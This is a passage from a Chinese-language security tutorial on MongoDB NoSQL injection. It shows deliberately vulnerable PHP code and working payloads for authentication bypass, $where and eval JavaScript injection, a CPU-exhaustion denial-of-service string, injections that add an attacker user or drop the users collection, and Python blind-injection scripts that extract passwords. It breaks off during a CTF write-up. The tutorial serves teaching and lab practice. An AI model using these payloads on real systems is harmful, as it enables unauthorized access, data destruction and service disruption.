class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span> =&gt; $uname,</span><br><span class="line">    <span class="string">&#x27;pwd&#x27;</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . $user[<span class="string">&#x27;uname&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . $user[<span class="string">&#x27;pwd&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传递的参数是一个数组，比较安全。这种形式叫 <code>ODM</code>，它会帮你过滤数据，所以一般不用担心原语句被破坏。</p>
+<blockquote>
+<p><code>ORM</code> 对应关系型数据库，如 MySQL；<code>ODM</code> 对应文档型数据库，如 MongoDB。</p>
+</blockquote>
+<p>当我们用公共用户ca01h输入时，显示出username和password：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315145255.png" alt=""></p>
+<p>这是一个正常的输入，数据处理过程如下图所示：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315155248.png" alt=""></p>
+<p>PHP允许最终用户通过将URL参数更改为带有方括号的参数来将GET查询字符串输入更改为数组，我们试一下这种输入：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315153912.png" alt=""></p>
+<blockquote>
+<p>$ne即not equal不等于</p>
+</blockquote>
+<p>amazing~所有用户都查出来了，再看一下数据处理过程：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315154547.png" alt=""></p>
+<p>对于PHP本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个value的值为1的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为payload进行攻击。</p>
+<p>这种方式也是我们通常用来验证网站是否存在NoSQL注入的第一步。</p>
+<h3 id="联合查询注入">联合查询注入</h3>
+<p>我们都知道在SQL时代拼接字符串容易造成SQL注入，NoSQL也有类似问题，但是现在无论是PHP的MongoDB driver还是node.js的mongoose都必须要求查询条件必须是一个数组或者query对象了，因此简单看一下就好。</p>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> query =<span class="string">&quot;&#123; username: &#x27;&quot;</span> + $username + <span class="string">&quot;&#x27;, password: &#x27;&quot;</span> + $password + <span class="string">&quot;&#x27; &#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password&#x3D;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
+<p>相当于执行了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
+<p>这种手法和SQL注入比较相似：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;))</span><br></pre></td></tr></table></figure>
+<h3 id="JavaScript注入">JavaScript注入</h3>
+<h4 id="where操作符">$where操作符</h4>
+<p>在MongoDB中 $where操作符是可以执行JavaScript语句的，在MongoDB 2.4之前，通过$where操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到mongo shell中的全局函数和属性。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$function = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;$where&#x27;</span> =&gt; $function</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MongoDB 2.4版本之前，可以访问到db属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;&#39;||1) return &#123;&#39;username&#39;: tojson(db.getCollectionNames()), &#39;password&#39;: &#39;hacked&#39;&#125;&#125;&#x2F;&#x2F;&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>由此可以扩展出其他的很多类似的payload。</p>
+<p>MongoDB 2.4版本之后，无法访问全局属性，NoSQL中的万能密码payload(单引号闭合)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;admin&#39; || &#39;&#39; &#x3D; &#39;</span><br></pre></td></tr></table></figure>
+<p>相当于执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$function &#x3D; &quot;function() &#123;if(this.uname &#x3D;&#x3D; &#39;anything&#39; &amp;&amp; this.pwd &#x3D;&#x3D; &#39;admin&#39; || &#39;&#39; &#x3D;&#x3D; &#39;&#39;) return &#123;&#39;username&#39;: this.uname, &#39;password&#39;: this.pwd&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+<p>此外还有一个类似于DOS攻击的payload，可以让服务器CPU飙升到100%持续5秒：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;1;(function()&#123;var date &#x3D; new Date(); do&#123;curDate &#x3D; new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
+<h4 id="eval">eval</h4>
+<p>注意，<code>eval</code>使用方式在Mongo3.0之后已经被废弃了，而且在官方页面中也没有Mongo3.0版本之前的下载链接了，以下的实例代码未经测试，仅提供给大家一个思路，以下代码引用自https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$cmd = <span class="keyword">new</span> MongoDB\Driver\Command([</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;</span>.$uname<span class="string">&#x27;&#125;)&quot;</span></span><br><span class="line"><span class="string">]);</span></span><br><span class="line"><span class="string">echo &quot;db.users.distinct(&#x27;</span>uname<span class="string">&#x27;, &#123;uname: &#x27;</span><span class="string">&quot;.<span class="subst">$uname</span>&#x27;&#125;)&quot;</span>;</span><br><span class="line">$result = $manager-&gt;executeCommand(<span class="string">&#x27;sec_test&#x27;</span>, $cmd)-&gt;toArray();</span><br><span class="line">$result =((<span class="keyword">array</span>)$result[<span class="number">0</span>])[<span class="string">&#x27;retval&#x27;</span>];</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>往users集合插入攻击者用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
+<p>删掉users集合：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
+<h4 id="mapReduce">mapReduce</h4>
+<p>MongoDB中的<code>mapReduce</code>函数有点类似于MySQL中的<code>group by</code>操作，下面是一个官方文档的例子，在集合 orders 中查找 status:“A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316201954.png" alt=""></p>
+<p>简单的解释一下：</p>
+<p><code>map</code>函数用于分组：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span>&#123; emit(param1, param2); &#125;</span><br></pre></td></tr></table></figure>
+<p>param1：需要分组的字段，this.字段名；</p>
+<p>param2：需要进行统计的字段，this.字段名。</p>
+<p><code>reduce</code>函数用于处理需要统计的字段：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params">key, values</span>)</span>&#123; <span class="comment">// 统计字段处理 &#125;</span></span><br></pre></td></tr></table></figure>
+<p>key： 指分组字段（emit的param1）对应的值；</p>
+<p>values：指需要统计的字段（emit的param2）值组成的数组。</p>
+<p>Map函数和Reduce函数可以使用 JavaScript 来实现，使得MapReduce的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> <span class="string">&quot;/vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$param = $_POST[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line">$collection = (<span class="keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;</span><br><span class="line">$map = <span class="string">&quot;function() &#123;</span></span><br><span class="line"><span class="string">		    for (var i = 0; i &lt; this.items.length; i++) &#123;</span></span><br><span class="line"><span class="string">		 	emit(this.name, this.items[i].<span class="subst">$param</span>);    &#125; </span></span><br><span class="line"><span class="string">		    &#125;&quot;</span>;</span><br><span class="line">$reduce = <span class="string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;</span><br><span class="line">$opt = <span class="string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$results = $collection-&gt;mapReduce($map, $reduce, $out);</span><br></pre></td></tr></table></figure>
+<p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: ‘x’ &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1</span><br></pre></td></tr></table></figure>
+<p>那么在MongoDB中就相当于执行了下面这条语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.stores.mapReduce(function() &#123; </span><br><span class="line">for (var i&#x3D;0; i &lt; this.items.length; i++) &#123;</span><br><span class="line">emit(this.name, this.items[i].a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">function(kv) &#123; return 1; &#125;, &#123; out: &#39;x&#39; &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;,</span><br><span class="line">function(name, sum) &#123;</span><br><span class="line">return Array.sum(sum); &#125;, &#123; out: &#39;totals&#39; &#125;);&quot;</span><br></pre></td></tr></table></figure>
+<p>相当于直接控制了整个MongoDB的操作。</p>
+<p>但我们也同时发现，构建这样的payload是有一定难度的，需要我们对MongoDB，JavaScript和业务都有足够的了解，这也是NoSQL注入的局限性。但是，这个例子也告诉我们有用户输入的地方就有危险存在，比如后面有一个CTF题，用的也是MongoDB中的聚合函数<code>aggregate</code>，但是因为一个GET参数而存在注入漏洞。</p>
+<h3 id="盲注">盲注</h3>
+<p>回想一想上面的例子，假如页面只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用<code>substr</code>，而在 MongoDB 里我们有 <code>$regex</code>。</p>
+<p>已知某一个用户名的前提下判断的密码长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;.&#123;5&#125;</span><br></pre></td></tr></table></figure>
+<p>逐位提取字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># url格式</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.&#123;4&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.&#123;3&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca0.&#123;2&#125;</span><br><span class="line"></span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.*</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.*</span><br><span class="line"></span><br><span class="line"># json格式</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>当然，提到盲注肯定少不了脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;?username=%s&amp;password[$regex]=^%s&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.get(target + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
+<p>爆破密码结果如下：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316231231.png" alt=""></p>
+<p>类似的还有POST的版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.post(target, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
+<p>当然这里的脚本还是有一些改进的地方，比如可以首先判断用户名或密码长度，而且上面代码去掉了一些特殊字符等等的。这里就不再多做演示了，刚好下面有一个实例靶机是需要写Python脚本盲注MongoDB，那个代码考虑的问题更多，可以稍微看一下。</p>
+<h2 id="0x04-Node-JS-MongoDB注入">0x04 Node.JS MongoDB注入</h2>
+<p>技巧跟PHP MongoDB是类似的，这里就提供一些Node.JS的靶场给大家练练手：</p>
+<p><a target="_blank" rel="noopener" href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ricardojoserf/NoSQL-injection-example">https://github.com/ricardojoserf/NoSQL-injection-example</a></p>
+<h2 id="0x05-MongoDB-注入实例">0x05 MongoDB 注入实例</h2>
+<h3 id="CTF-NopeSQL">CTF NopeSQL</h3>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://cybrics.net/tasks/nopesql">https://cybrics.net/tasks/nopesql</a></p>
+<p>扫描网站发现有Git源码泄露，用GitHack工具获得<code>index.php</code>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__ . &quot;&#x2F;vendor&#x2F;autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">function auth($username, $password) &#123;</span><br><span class="line">    $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query &#x3D; &#39;&#123;&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;&#125;&#39;;</span><br><span class="line">    $document &#x3D; $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; false;</span><br><span class="line">if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; isset($_COOKIE[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</span><br><span class="line">    if ($user) &#123;</span><br><span class="line">        setcookie(&#39;username&#39;, $_POST[&#39;username&#39;]);</span><br><span class="line">        setcookie(&#39;password&#39;, $_POST[&#39;password&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php if ($user &#x3D;&#x3D; true): ?&gt;</span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news 